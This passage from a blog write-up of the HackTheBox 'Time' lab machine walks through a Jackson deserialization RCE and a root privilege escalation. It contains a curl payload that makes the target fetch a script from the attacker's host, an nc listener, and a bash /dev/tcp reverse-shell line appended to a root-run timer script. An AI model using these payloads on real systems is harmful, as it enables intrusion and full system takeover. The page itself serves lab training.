class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk11\">&quot;Start a reverse shell listener on :$LPORT and press &lt;ENTER&gt; ... &quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk11\">&quot;-&gt; nc -lvnp $LPORT&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">read</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">curl -X POST -d </span><span class=\"mtk11\">&quot;mode=2&amp;data=%5B%22ch.qos.logback.core.db.DriverManagerConnectionSource%22,%20%7B%22url%22:%22jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT%20FROM%20&#39;http://$LHOST:$WPORT/$PAYLD&#39;%22%7D%5D&quot;</span><span class=\"mtk1\"> --max-time 30 $1 </span><span class=\"mtk7\">&gt;</span><span class=\"mtk1\">/dev/null</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">kill</span><span class=\"mtk1\"> $pypid</span></span></span></code></pre>\n<p>... after executing it, we are presented with a reverse shell and can get the user flag:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"bash\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cat </span><span class=\"mtk7\">~</span><span class=\"mtk1\">/user.txt</span></span></span></code></pre>\n<pre class=\"grvsc-container abyss\" data-language=\"txt\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">6c0*****************************</span></span></code></pre>\n<h2 id=\"enumeration\" style=\"position:relative;\"><a href=\"#enumeration\" aria-label=\"enumeration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>enumeration</h2>\n<h3 id=\"linpeas\" style=\"position:relative;\"><a href=\"#linpeas\" aria-label=\"linpeas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>linpeas</h3>\n<p>Transferring <code>linpeas.sh</code> to the target machine and executing it reveals some rather interesting facts.</p>\n<p>Several lines of the enumerations script output will tell you that there is an interesting writeable file in <code>/usr/bin/timer_backup.sh</code>, furthermore, in the <em>\"System Timers\"</em> section we can notice that the top timer has a rather similar name:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"txt\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[+] System timers                                                                 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                               </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Sat 2021-02-20 23:14:01 UTC 4s left       Sat 2021-02-20 23:13:51 UTC 5s ago               timer_backup.timer           timer_backup.service</span></span></code></pre>\n<p>... taking a look at this timer/service in <code>/etc/systemd/system/timer_backup.[timer|service]</code> points us to yet another file - <code>/etc/systemd/system/web_backup.service</code>:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"bash\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cat /etc/systemd/system/timer_backup.</span><span class=\"mtk7\">*</span></span></span></code></pre>\n<pre class=\"grvsc-container abyss\" data-language=\"txt\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[Unit]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Description=Creates backups of the website</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[Service]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ExecStart=/bin/bash /usr/bin/timer_backup.sh</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pericles@time:/dev/shm$ cat /etc/systemd/system/timer_backup.*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[Unit]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Description=Calls website backup</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Wants=timer_backup.timer</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">WantedBy=multi-user.target</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[Service]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ExecStart=/usr/bin/systemctl restart web_backup.service</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[Unit]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Description=Backup of the website</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Requires=timer_backup.service</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[Timer]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Unit=timer_backup.service</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">#OnBootSec=10s</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">#OnUnitActiveSec=10s</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OnUnitInactiveSec=10s</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">AccuracySec=1ms</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[Install]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">WantedBy=timers.target</span></span></code></pre>\n<p>... and taking a look at that ...</p>\n<pre class=\"grvsc-container abyss\" data-language=\"bash\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cat /etc/systemd/system/web_backup.sh</span></span></span></code></pre>\n<pre class=\"grvsc-container abyss\" data-language=\"txt\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[Unit]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Description=Creates backups of the website</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[Service]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ExecStart=/bin/bash /usr/bin/timer_backup.sh</span></span></code></pre>\n<p>... it circles back to the intersting file <code>/usr/bin/timer_backup.sh</code> - which we can edit! </p>\n<h2 id=\"privesc\" style=\"position:relative;\"><a href=\"#privesc\" aria-label=\"privesc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>privesc</h2>\n<p>The discoveries made during enumeration make privesc rather trivial - simply append a line to spawn a reverse shell to the bash script that is run as root in periodical intervals:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"bash\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk11\">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.206/4443 0&gt;&amp;1&quot;&#39;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">&gt;&gt;</span><span class=\"mtk1\"> /usr/bin/timer_backup.sh</span></span></span></code></pre>\n<p>... even though the shell isn't all too stable, it still provides us with more than enough time to retrieve the root flag:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"bash\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cat </span><span class=\"mtk7\">~</span><span class=\"mtk1\">/root.txt</span></span></span></code></pre>\n<pre class=\"grvsc-container abyss\" data-language=\"txt\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">ea1*****************************</span></span></code></pre>\n<h2 id=\"further-reading\" style=\"position:relative;\"><a href=\"#further-reading\" aria-label=\"further reading permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>further reading</h2>\n<ul>\n<li><a href=\"https://javachannel.org/posts/jackson-databind-and-default-typing-vulnerabilities/\">Jackson-databind and Default Typing Vulnerabilities</a></li>\n<li><a href=\"https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html\">Abusing H2 Database ALIAS</a></li>\n<li><a href=\"https://blog.doyensec.com/2019/07/22/jackson-gadgets.html\">CVE-2019-12384 - Blog Post</a></li>\n</ul>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .abyss { background-color: #000c18; }\n  .abyss .mtki { font-style: italic; }\n  .abyss .mtk1 { color: #6688CC; }\n  .abyss .mtk11 { color: #22AA44; }\n  .abyss .mtk15 { color: #9966B8; }\n  .abyss .mtk7 { color: #225588; }\n  .abyss .mtk4 { color: #F280D0; }\n  .abyss .mtk3 { color: #384887; }\n  .abyss .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>","timeToRead":10,"frontmatter":{"title":"HTB - Time","date":"4 months ago","ref":"HackTheBox/machines/Time","desc":"A medium HackTheBox machine involving Jackson (JSON library) and system timers.","coverImage":{"childImageSharp":{"fluid":{"src":"/static/78de74a60129cc336f0bd1b96ab95e39/403a4/logo.webp"}}}}}},"pageContext":{"slug":"/blog/writeups/htb-time/"}},"staticQueryHashes":[]}